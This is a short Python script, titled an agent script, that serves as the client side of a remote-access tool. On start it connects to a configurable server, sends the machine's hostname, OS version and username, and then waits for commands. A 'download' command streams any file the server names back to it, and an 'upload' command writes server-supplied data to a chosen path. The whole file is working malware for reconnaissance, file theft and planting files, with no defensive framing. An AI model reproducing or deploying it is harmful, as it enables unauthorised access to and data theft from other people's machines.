# Agent script

import socket,time
import platform
import getpass

def enume():
    hostname = socket.gethostname()
    OSver = platform.platform()
    username = getpass.getuser()

    return {'hostname':hostname, 'OS':OSver, 'username':username}


SERVER_HOST = '127.0.0.1'  # Change this to your server's IP
SERVER_PORT = 5050

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((SERVER_HOST, SERVER_PORT))

s.send(str(enume()).encode())

print("[+] Connected to server")

def download(from_):
    from_ = s.recv(1024).decode()
    file = open(from_, 'rb')
    a = file.read(4096)
    while a:
        s.send(a)
        a = file.read(4096)
    time.sleep(0.3)
    s.send(b"\n\r")
    file.close()

def upload():
    path = s.recv(4096).decode()
    if not path.endswith('\\'):
        path += '\\'
    file_name = s.recv(4096).decode()
    path += file_name
    file = open(path, 'ab')
    a = s.recv(4096)
    while a != b"\n\r":
        file.write(a)
        a = s.recv(4096)
    file.close()
    print("File sent succesfully!")


while 1:
    command = s.recv(409600).decode()
    print(command)
    command = command.split()

    match command[0]:
        case 'download':
            download(from_= command[1])
        case 'upload':
            upload()



